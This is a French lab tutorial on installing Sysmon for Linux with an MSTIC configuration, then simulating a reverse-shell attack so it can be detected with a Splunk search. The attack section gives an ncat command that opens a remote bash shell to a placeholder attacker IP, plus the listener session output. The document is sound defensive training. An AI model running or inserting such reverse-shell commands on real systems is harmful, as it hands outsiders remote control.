# Surveillance et enquête sur l'exécution de processus suspects

- L’installation de Sysmon pour Linux avec une configuration XML avancée pour détecter plusieurs techniques MITRE ATT&CK.

- [Sysmon for Linux](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)

#### Installation de Sysmon for Linux

```sh
wget -q https://packages.microsoft.com/config/ubuntu/$(lsb_release -rs)/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
sudo dpkg -i packages-microsoft-prod.deb

sudo apt-get update
sudo apt-get install sysmonforlinux
```

## Configuration XML avancée

#### Créer un fichier de configuration

```sh
nano sysmon-config.xml
```

#### Puis coller le contenu XML suivant (extrait optimisé et indenté proprement) :

- [Base de configuration recommandée : MSTIC Sysmon Config](https://github.com/microsoft/MSTIC-Sysmon/blob/main/linux/configs/main.xml)

#### Lancer Sysmon avec la configuration

```sh
sysmon -i sysmon-config.xml
```

#### Vérifier que Sysmon fonctionne

```sh
sudo systemctl restart sysmon
sudo systemctl status sysmon
```

## Simuler une attaque - Reverse Shell avec ncat

#### Sur la machine d’attaque

```sh
root@attack:~# apt install ncat net-tools -y
root@attack:~# ncat -lnvp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.129.166.
Ncat: Connection from 192.168.129.166:33790.
ls
packages-microsoft-prod.deb
snap
splunkforwarder-9.4.3-237ebbd22314-linux-amd64.deb
sysmon-config.xml
pwd
/root
```

#### Sur la machine compromise (victime) :

```sh
apt install ncat net-tools -y
ncat <IP_ATTACK_MACHINE> 4444 -e /bin/bash
```

#### Vérification de la connexion :

```sh
lsof -i :4444
netstat -tulnp | grep 4444
```

## Analyse dans Splunk (Search & Reporting)

> `Requêtes dans Search & Reporting`

- Affiche tous les logs liés à Sysmon
- Filtre sur les événements identifiés comme techniques de type Command.
- Recherche spécifique d’utilisation de ncat.

```sh
index="linux_os_logs" process=sysmon TechniqueName=Command ncat
```

![Enterprise](/Splunk_Ubuntu/assets/splunk_linux_11.png)
